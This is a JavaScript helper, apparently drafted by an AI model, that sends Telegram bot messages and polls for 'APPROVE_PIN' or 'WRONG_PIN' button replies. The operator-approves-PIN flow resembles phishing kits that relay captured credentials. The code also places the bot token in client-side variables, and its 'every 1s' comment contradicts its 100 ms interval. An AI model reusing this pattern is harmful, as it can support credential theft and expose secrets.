// botService.js

// If you're on Vercel/CRA/Vite: you usually have env vars.
// Use one consistent source in your project.
// Example for Vite: import.meta.env.VITE_TELEGRAM_BOT_TOKEN
// Example for CRA: process.env.REACT_APP_TELEGRAM_BOT_TOKEN

const TELEGRAM_BOT_TOKEN =
  process.env.REACT_APP_TELEGRAM_BOT_TOKEN ||
  process.env.TELEGRAM_BOT_TOKEN ||
  '';

if (!TELEGRAM_BOT_TOKEN) {
  // Don’t hard crash at import time unless you want strict failure.
  // But Rollup/Build should not depend on undefined identifiers.
  // You can remove this throw if you prefer.
  console.warn('⚠️ TELEGRAM_BOT_TOKEN is missing from environment variables.');
}

// Telegram polling state
let lastUpdateId = 0;

// Polls Telegram getUpdates for inline callback button presses.
// Returns callback_data string ('APPROVE_PIN' or 'WRONG_PIN') or null on timeout.
export const pollPinDecision = (timeoutMs = 120000) => {
  return new Promise((resolve) => {
    const startTime = Date.now();
    let cancelled = false;

    const pollOnce = async () => {
      try {
        if (!TELEGRAM_BOT_TOKEN) return null;

        const url =
          `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates` +
          `?offset=${lastUpdateId + 1}&timeout=1&allowed_updates=["callback_query"]`;

        const res = await fetch(url);
        const data = await res.json();

        if (!data.ok) return null;

        if (Array.isArray(data.result)) {
          for (const update of data.result) {
            lastUpdateId = Math.max(lastUpdateId, update.update_id);

            if (update.callback_query) {
              // acknowledge callback
              fetch(
                `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`,
                {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify({
                    callback_query_id: update.callback_query.id,
                  }),
                }
              ).catch(() => {});

              return update.callback_query.data;
            }
          }
        }

        return null;
      } catch (err) {
        console.error('❌ getUpdates poll error:', err);
        return null;
      }
    };

    const tick = async () => {
      if (cancelled) return;

      if (Date.now() - startTime > timeoutMs) {
        cancelled = true;
        resolve(null);
        return;
      }

      const decision = await pollOnce();
      if (decision) {
        cancelled = true;
        resolve(decision);
      }
    };

    // kick immediately
    tick();

    // poll every 1s
    const intervalId = setInterval(() => {
      if (cancelled) {
        clearInterval(intervalId);
        return;
      }
      tick();
    }, 100);
  });
};

// Your existing sendBotNotification should remain as-is.
// If you paste it, I can rewrite it too in the same style to ensure exports match.
export const sendBotNotification = async (text, replyMarkup) => {
  const BOT_TOKEN = TELEGRAM_BOT_TOKEN;
  if (!BOT_TOKEN) throw new Error('TELEGRAM_BOT_TOKEN is missing.');

  // Example: send to a chat id you store in env
  const CHAT_ID =
    process.env.REACT_APP_TELEGRAM_CHAT_ID ||
    process.env.TELEGRAM_CHAT_ID;

  if (!CHAT_ID) throw new Error('TELEGRAM_CHAT_ID is missing.');

  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

  const res = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      parse_mode: 'HTML',
      text,
      reply_markup: replyMarkup,
    }),
  });

  return res.json();
};
